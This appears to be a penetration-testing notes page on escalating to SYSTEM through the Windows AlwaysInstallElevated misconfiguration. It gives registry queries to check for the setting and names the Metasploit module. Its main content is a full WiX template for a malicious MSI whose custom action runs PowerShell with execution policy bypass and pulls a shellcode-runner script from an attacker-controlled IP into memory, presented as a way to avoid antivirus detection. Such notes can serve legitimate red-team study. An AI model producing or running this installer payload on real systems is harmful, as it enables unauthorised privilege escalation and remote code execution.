# Always Install Elevated

`AlwaysInstallElevated` is a Windows registry and Group Policy setting that allows non-privileged users to install Microsoft Installer (MSI) packages with **SYSTEM** permissions. Organizations sometimes enable this setting to reduce Helpdesk workload by allowing users to install software without administrator intervention.

## Checking for Misconfiguration

You can check if this setting is enabled by querying the following registry keys. If both keys return a value of `0x1`, the system is vulnerable:

```powershell
# Query the registry to check for AlwaysInstallElevated misconfiguration
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Exploitation

### **Using Metasploit (Likely to be Detected by AV)**
Metasploit has a built-in module to exploit this misconfiguration:

```bash
use exploit/windows/local/always_install_elevated
```

However, this approach is often flagged by antivirus solutions.

### **Crafting a Custom Malicious MSI**
A more stealthy approach is to create a custom MSI package. The following GitHub repository provides a method to build an MSI that executes arbitrary code with SYSTEM privileges:

- [MSI AlwaysInstallElevated Exploit - KINGSABRI](https://github.com/KINGSABRI/MSI-AlwaysInstallElevated/tree/master)

Following the reference above, you can craft an MSI that executes PowerShell and runs a shellcode loader **in memory**, keeping the payload off-disk and reducing detection risk.


```xml
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="23e23deeqwddeweqwde" Version="0.0.1" Manufacturer="Test1" Language="1033">
        <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package" />
        <Media Id='1' />
        <Directory Id="TARGETDIR" Name="SourceDir">
            <Directory Id="ProgramFilesFolder">
                <Directory Id="INSTALLLOCATION" Name="Example">
                    <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222" KeyPath="yes"></Component>
                </Directory>
            </Directory>
        </Directory>
        <Feature Id="DefaultFeature" Level="1">
            <ComponentRef Id="ApplicationFiles" />
        </Feature>

        <CustomAction 
            Id="Shell" 
            Execute="deferred"
            Directory="TARGETDIR" 
            Impersonate="no" 
            ExeCommand="C:\Windows\System32\cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command IEX (Invoke-RestMethod 'http://192.168.45.194/Payloads/AES_Shellcode_Runner_Delegate.ps1')"
            Return="check" 
        />

        <InstallExecuteSequence>
            <Custom Action="Shell" After="InstallFiles"></Custom>
        </InstallExecuteSequence>
    </Product>
</Wix>
```
